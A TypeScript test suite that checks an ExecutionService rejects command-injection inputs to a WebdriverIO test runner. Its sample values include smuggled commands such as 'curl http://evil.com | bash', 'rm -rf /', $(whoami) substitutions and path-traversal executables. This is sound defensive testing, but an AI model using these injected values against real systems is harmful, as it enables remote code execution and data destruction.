import { describe, it } from 'node:test';
import * as assert from 'node:assert';
import { ExecutionService } from '../services/ExecutionService.js';
import * as path from 'path';
import * as fs from 'fs';

describe('ExecutionService - Issue #17: Edge Cases and Additional Security', () => {
  let executionService: ExecutionService;
  let testProjectRoot: string;

  function setupTest() {
    executionService = new ExecutionService();
    testProjectRoot = path.join(process.cwd(), 'test-edge-' + Date.now());
    if (!fs.existsSync(testProjectRoot)) {
      fs.mkdirSync(testProjectRoot, { recursive: true });
    }
    fs.writeFileSync(
      path.join(testProjectRoot, 'wdio.conf.ts'),
      'export const config = { runner: "local", framework: "cucumber" };'
    );
    fs.mkdirSync(path.join(testProjectRoot, 'reports'), { recursive: true });
  }

  function cleanupTest() {
    if (fs.existsSync(testProjectRoot)) {
      fs.rmSync(testProjectRoot, { recursive: true, force: true });
    }
  }

  describe('Newline character injection prevention', () => {
    it('should reject specificArgs with newline character (\\n)', async () => {
      setupTest();
      try {
        const maliciousArgs = '--timeout 30000\ncurl http://evil.com';
        const result = await executionService['runTest'](testProjectRoot, { 
          specificArgs: maliciousArgs 
        });
        
        assert.strictEqual(result.success, false, 'Newline injection should fail');
        assert.ok(result.error?.includes('Invalid specificArgs'), 
          `Expected specificArgs validation error, got: ${result.error}`);
      } finally {
        cleanupTest();
      }
    });

    it('should reject specificArgs with carriage return (\\r)', async () => {
      setupTest();
      try {
        const maliciousArgs = '--timeout 30000\rcurl http://evil.com';
        const result = await executionService['runTest'](testProjectRoot, { 
          specificArgs: maliciousArgs 
        });
        
        assert.strictEqual(result.success, false, 'Carriage return injection should fail');
        assert.ok(result.error?.includes('Invalid specificArgs'), 
          `Expected specificArgs validation error, got: ${result.error}`);
      } finally {
        cleanupTest();
      }
    });

    it('should reject specificArgs with CRLF sequence', async () => {
      setupTest();
      try {
        const maliciousArgs = '--timeout 30000\r\ncurl http://evil.com';
        const result = await executionService['runTest'](testProjectRoot, { 
          specificArgs: maliciousArgs 
        });
        
        assert.strictEqual(result.success, false, 'CRLF injection should fail');
        assert.ok(result.error?.includes('Invalid specificArgs'), 
          `Expected specificArgs validation error, got: ${result.error}`);
      } finally {
        cleanupTest();
      }
    });
  });

  describe('overrideCommand validation', () => {
    it('should reject overrideCommand with semicolon', async () => {
      setupTest();
      try {
        const result = await executionService['runTest'](testProjectRoot, { 
          overrideCommand: 'npm run test; curl http://evil.com' 
        });
        
        assert.strictEqual(result.success, false, 'OverrideCommand semicolon should fail');
        assert.ok(result.error?.includes('Invalid overrideCommand'), 
          `Expected overrideCommand validation error, got: ${result.error}`);
      } finally {
        cleanupTest();
      }
    });

    it('should reject overrideCommand with pipe', async () => {
      setupTest();
      try {
        const result = await executionService['runTest'](testProjectRoot, { 
          overrideCommand: 'npm run test | tee /tmp/log' 
        });
        
        assert.strictEqual(result.success, false, 'OverrideCommand pipe should fail');
        assert.ok(result.error?.includes('Invalid overrideCommand'), 
          `Expected overrideCommand validation error, got: ${result.error}`);
      } finally {
        cleanupTest();
      }
    });

    it('should reject overrideCommand with backtick', async () => {
      setupTest();
      try {
        const result = await executionService['runTest'](testProjectRoot, { 
          overrideCommand: 'npm run test `whoami`' 
        });
        
        assert.strictEqual(result.success, false, 'OverrideCommand backtick should fail');
        assert.ok(result.error?.includes('Invalid overrideCommand'), 
          `Expected overrideCommand validation error, got: ${result.error}`);
      } finally {
        cleanupTest();
      }
    });

    it('should reject overrideCommand with dollar sign', async () => {
      setupTest();
      try {
        const result = await executionService['runTest'](testProjectRoot, { 
          overrideCommand: 'npm run test $(whoami)' 
        });
        
        assert.strictEqual(result.success, false, 'OverrideCommand dollar should fail');
        assert.ok(result.error?.includes('Invalid overrideCommand'), 
          `Expected overrideCommand validation error, got: ${result.error}`);
      } finally {
        cleanupTest();
      }
    });

    it('should reject overrideCommand with ampersand', async () => {
      setupTest();
      try {
        const result = await executionService['runTest'](testProjectRoot, { 
          overrideCommand: 'npm run test & curl http://evil.com' 
        });
        
        assert.strictEqual(result.success, false, 'OverrideCommand ampersand should fail');
        assert.ok(result.error?.includes('Invalid overrideCommand'), 
          `Expected overrideCommand validation error, got: ${result.error}`);
      } finally {
        cleanupTest();
      }
    });

    it('should accept valid overrideCommand without metacharacters', async () => {
      setupTest();
      try {
        const result = await executionService['runTest'](testProjectRoot, { 
          overrideCommand: 'npm run test' 
        });
        
        // Should not fail on validation (may fail for other reasons)
        if (result.error) {
          assert.ok(!result.error.includes('Invalid overrideCommand'), 
            `Valid overrideCommand was rejected: ${result.error}`);
        }
      } finally {
        cleanupTest();
      }
    });
  });

  describe('Empty string and whitespace handling', () => {
    it('should handle empty tags gracefully', async () => {
      setupTest();
      try {
        const result = await executionService['runTest'](testProjectRoot, { tags: '' });
        
        if (result.error) {
          assert.ok(!result.error.includes('Invalid tag expression'), 
            `Empty tags should be valid, got: ${result.error}`);
        }
      } finally {
        cleanupTest();
      }
    });

    it('should handle whitespace-only tags gracefully', async () => {
      setupTest();
      try {
        const result = await executionService['runTest'](testProjectRoot, { tags: '   ' });
        
        if (result.error) {
          assert.ok(!result.error.includes('Invalid tag expression'), 
            `Whitespace-only tags should be valid, got: ${result.error}`);
        }
      } finally {
        cleanupTest();
      }
    });

    it('should handle empty specificArgs gracefully', async () => {
      setupTest();
      try {
        const result = await executionService['runTest'](testProjectRoot, { specificArgs: '' });
        
        if (result.error) {
          assert.ok(!result.error.includes('Invalid specificArgs'), 
            `Empty specificArgs should be valid, got: ${result.error}`);
        }
      } finally {
        cleanupTest();
      }
    });

    it('should filter empty strings from split specificArgs', async () => {
      setupTest();
      try {
        // Multiple spaces should not create empty args
        const result = await executionService['runTest'](testProjectRoot, { 
          specificArgs: '--timeout  30000    --maxInstances   2' 
        });
        
        if (result.error) {
          assert.ok(!result.error.includes('Invalid specificArgs'), 
            `Multiple spaces should be handled, got: ${result.error}`);
        }
      } finally {
        cleanupTest();
      }
    });
  });

  describe('Path traversal prevention in executable', () => {
    it('should reject executable with path traversal (..)', async () => {
      setupTest();
      try {
        const result = await executionService['runTest'](testProjectRoot, { 
          overrideCommand: '../../../bin/malicious run' 
        });
        
        // Should fail on executable validation
        assert.strictEqual(result.success, false, 'Path traversal should fail');
        assert.ok(result.error?.includes('Invalid executable'), 
          `Expected executable validation error, got: ${result.error}`);
      } finally {
        cleanupTest();
      }
    });

    it('should reject relative paths in executable', async () => {
      setupTest();
      try {
        const result = await executionService['runTest'](testProjectRoot, { 
          overrideCommand: './malicious/script run' 
        });
        
        // Should fail on executable validation
        assert.strictEqual(result.success, false, 'Relative path should fail');
        assert.ok(result.error?.includes('Invalid executable'), 
          `Expected executable validation error, got: ${result.error}`);
      } finally {
        cleanupTest();
      }
    });

    it('should accept absolute paths in executable', async () => {
      setupTest();
      try {
        const result = await executionService['runTest'](testProjectRoot, { 
          overrideCommand: '/usr/bin/npm run test' 
        });
        
        // Should not fail on executable validation (may fail for other reasons)
        if (result.error) {
          assert.ok(!result.error.includes('Invalid executable'), 
            `Absolute path should be valid, got: ${result.error}`);
        }
      } finally {
        cleanupTest();
      }
    });

    it('should accept plain binary names', async () => {
      setupTest();
      try {
        const result = await executionService['runTest'](testProjectRoot, { 
          overrideCommand: 'npx wdio run wdio.conf.ts' 
        });
        
        // Should not fail on executable validation
        if (result.error) {
          assert.ok(!result.error.includes('Invalid executable'), 
            `Plain binary should be valid, got: ${result.error}`);
        }
      } finally {
        cleanupTest();
      }
    });
  });

  describe('Unicode and special character handling', () => {
    it('should reject tags with Unicode control characters', () => {
      const controlCharTags = [
        '@smoke\u0000test',  // NULL character
        '@smoke\u0001test',  // Start of heading
        '@smoke\u001Ftest',  // Unit separator
      ];

      const allowedPattern = /^[@\w\s()!&|,]+$/;

      for (const tag of controlCharTags) {
        const isValid = allowedPattern.test(tag);
        assert.ok(!isValid, `Unicode control character should fail: ${JSON.stringify(tag)}`);
      }
    });

    it('should document that Unicode characters are NOT matched by \\w in tag validation', () => {
      // IMPORTANT: JavaScript \w only matches [A-Za-z0-9_] by default
      // It does NOT match Unicode word characters (e.g., Cyrillic, Chinese, etc.)
      // This is actually a GOOD security posture - rejecting non-ASCII keeps the attack surface minimal
      const unicodeTags = [
        '@тест',      // Cyrillic
        '@测试',      // Chinese
        '@テスト',    // Japanese
        '@परीक्षण',  // Hindi
      ];

      const allowedPattern = /^[@\w\s()!&|,]+$/;

      for (const tag of unicodeTags) {
        const isValid = allowedPattern.test(tag);
        // These will FAIL because \w doesn't match non-ASCII Unicode
        // This is intentional - ASCII-only tags are safer
        assert.ok(!isValid, `Non-ASCII Unicode should be rejected (security): ${tag}`);
      }
      
      // If international tags are needed in the future, the pattern would need to be:
      // /^[@\p{L}\p{N}\s()!&|,]+$/u (with u flag for Unicode property escapes)
      // But this widens the attack surface, so ASCII-only is preferred
    });
  });

  describe('Combined attack vectors', () => {
    it('should reject multiple injection techniques combined', async () => {
      setupTest();
      try {
        const result = await executionService['runTest'](testProjectRoot, {
          tags: '@smoke`whoami`',
          specificArgs: '--log; curl http://evil.com | bash'
        });
        
        assert.strictEqual(result.success, false, 'Combined injection should fail');
        // Should catch the first validation error (tags)
        assert.ok(result.error?.includes('Invalid'), 
          `Expected validation error, got: ${result.error}`);
      } finally {
        cleanupTest();
      }
    });

    it('should validate all parameters before execution', async () => {
      setupTest();
      try {
        const result = await executionService['runTest'](testProjectRoot, {
          tags: '@valid',
          specificArgs: '--malicious; rm -rf /',
          overrideCommand: 'npm test'
        });
        
        assert.strictEqual(result.success, false, 'Should catch specificArgs injection');
        assert.ok(result.error?.includes('Invalid specificArgs'), 
          `Expected specificArgs error, got: ${result.error}`);
      } finally {
        cleanupTest();
      }
    });
  });
});